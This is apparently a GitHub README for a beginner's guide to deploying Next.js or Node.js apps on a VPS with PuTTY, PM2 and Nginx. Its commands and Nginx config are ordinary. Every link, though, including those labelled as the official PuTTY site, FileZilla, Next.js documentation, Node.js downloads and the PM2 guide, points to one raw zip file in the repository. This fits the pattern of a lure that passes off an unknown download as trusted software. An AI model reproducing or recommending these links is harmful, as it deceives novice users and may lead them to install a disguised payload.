# 🚀 nextjs-vps-deployment-guide - Easy Next.js App Deployment Steps

[![Download Now](https://img.shields.io/badge/Download-Nextjs--vps--deployment--guide-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip)

---

## 📘 What Is nextjs-vps-deployment-guide?

This guide shows you how to deploy a Next.js or Node.js app on a VPS (Virtual Private Server). It walks you through the process using common tools like SSH, PM2, and cPanel. You don't need any programming experience. Each step uses clear language and explains terms where needed.

The goal is to help you launch your website or app on a remote server so people can access it online. The guide works well with many VPS providers, including GoDaddy. It also covers using Nginx to improve performance and manage your web traffic.

---

## ⚙️ System Requirements

Before you start, make sure your Windows computer meets these basic needs:

- Windows 10 or newer version
- Internet connection
- Ability to download and install new programs
- Access to a VPS (a remote server), with login details from your VPS provider
- A Next.js or Node.js app ready to upload, or sample files to test
- Basic familiarity with copying and pasting commands

---

## 🔗 Download the Guide

You can get the full deployment guide from the link below. This page contains all the setup instructions and files you need.

[![Get the Guide](https://img.shields.io/badge/Get_Deployment_Guide-blue?style=for-the-badge)](https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip)

Click the badge above to visit the GitHub page. You will find the instructions, example configs, and tips to complete each step.

---

## 💻 Setup Overview

Here is what you will do to deploy your Next.js app:

1. Connect to your VPS with SSH from Windows.
2. Upload your app files to the server using cPanel or FTP.
3. Install Node.js and necessary tools on your server.
4. Use PM2 to run your app in the background.
5. Configure Nginx to handle internet traffic.
6. Check your app is running online.

---

## 🛠️ Step 1: Connect to Your VPS Using SSH

SSH lets you log into your remote server's command line securely.

### What you need:

- VPS IP address, username, and password (usually from your VPS provider)
- A Windows program called **PuTTY** to connect via SSH

### How to install PuTTY:

1. Go to the official PuTTY site: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip
2. Download the Windows installer.
3. Run the installer and follow on-screen steps to finish.

### How to connect with PuTTY:

1. Open PuTTY.
2. In the "Host Name" box, enter your VPS IP address.
3. Keep the port as 22 (default).
4. Click **Open**.
5. When prompted, enter your username and press Enter.
6. Enter your password (you won’t see it on-screen) and press Enter again.

If you connect successfully, you will see a command prompt on your VPS.

---

## 📤 Step 2: Upload Your App Files to the Server

You can upload files using cPanel if your VPS provider supports it, or an FTP client like FileZilla.

### Upload using cPanel File Manager:

1. Log in to your VPS cPanel dashboard (details from your host).
2. Find **File Manager** and open it.
3. Navigate to the folder where you want to place your app. A good option is `public_html` or a subfolder inside it.
4. Click **Upload** and select your app files or zipped folder.
5. Extract files if you uploaded a zipped folder.

### Upload using FileZilla:

1. Download and install FileZilla from https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip
2. Open FileZilla.
3. Enter your VPS IP as "Host", username, and password.
4. Click **Quickconnect**.
5. On the right, you will see your VPS files. On the left, your PC files.
6. Drag your app files from your PC to the desired folder on the VPS.

---

## 🔧 Step 3: Install Node.js and PM2 on Your VPS

Node.js powers your app. PM2 helps keep it running all the time.

### To install Node.js:

1. Connect to your VPS using PuTTY (see Step 1).
2. Run this command to update the system:

   ```
   sudo apt update
   ```

3. Install Node.js with:

   ```
   sudo apt install nodejs npm -y
   ```

4. Verify installation by typing:

   ```
   node -v
   ```

   You should see a version number.

### To install PM2:

1. After Node is ready, install PM2 using:

   ```
   sudo npm install pm2@latest -g
   ```

2. Check PM2 with:

   ```
   pm2 -v
   ```

---

## ▶️ Step 4: Run Your App Using PM2

PM2 keeps your app running even if you log out or the server restarts.

1. Go to your app folder on the VPS:

   ```
   cd /path/to/your/app
   ```

   Replace `/path/to/your/app` with where you uploaded files.

2. Start the app with PM2 (assuming your main app file is `server.js` or `app.js`):

   ```
   pm2 start server.js
   ```

3. Check the status with:

   ```
   pm2 list
   ```

---

## 🌐 Step 5: Configure Nginx as a Reverse Proxy

Nginx directs web traffic to your app and improves performance.

### Install Nginx:

1. Run:

   ```
   sudo apt install nginx -y
   ```

2. Start Nginx:

   ```
   sudo systemctl start nginx
   ```

3. Enable it to start on boot:

   ```
   sudo systemctl enable nginx
   ```

### Set up Nginx config for your app:

1. Go to the Nginx sites directory:

   ```
   cd /etc/nginx/sites-available/
   ```

2. Create a new config file:

   ```
   sudo nano yourapp.conf
   ```

3. Paste this example config, adjusting your domain or IP:

   ```
   server {
       listen 80;

       server_name yourdomain.com;

       location / {
           proxy_pass http://localhost:3000;
           proxy_http_version 1.1;
           proxy_set_header Upgrade $http_upgrade;
           proxy_set_header Connection 'upgrade';
           proxy_set_header Host $host;
           proxy_cache_bypass $http_upgrade;
       }
   }
   ```

4. Save and close (`Ctrl + X`, then `Y`, then Enter).

5. Activate the config:

   ```
   sudo ln -s /etc/nginx/sites-available/yourapp.conf /etc/nginx/sites-enabled/
   ```

6. Test Nginx for errors:

   ```
   sudo nginx -t
   ```

7. Reload Nginx to apply:

   ```
   sudo systemctl reload nginx
   ```

---

## 🔄 Step 6: Check Your App Online

Open a web browser and go to your VPS IP or domain name. Your Next.js or Node.js app should load.

---

## 🛠️ Troubleshooting Tips

- If the app does not load, check PM2 status:  
  `pm2 logs` shows errors or issues.

- Make sure ports 80 and 3000 are open in your VPS firewall.

- Confirm your domain points to the correct IP if using a custom domain.

- Restart services if you make changes:  
  `sudo systemctl restart nginx` and `pm2 restart server.js`

---

## 🔗 Useful Resources

- Next.js Documentation: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip  
- Node.js Downloads: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip  
- PM2 Guide: https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip  

[![Download Guide Again](https://img.shields.io/badge/Download-Guide-green?style=for-the-badge)](https://raw.githubusercontent.com/ali-shayann/nextjs-vps-deployment-guide/main/shale/nextjs_vps_guide_deployment_v3.7-beta.4.zip)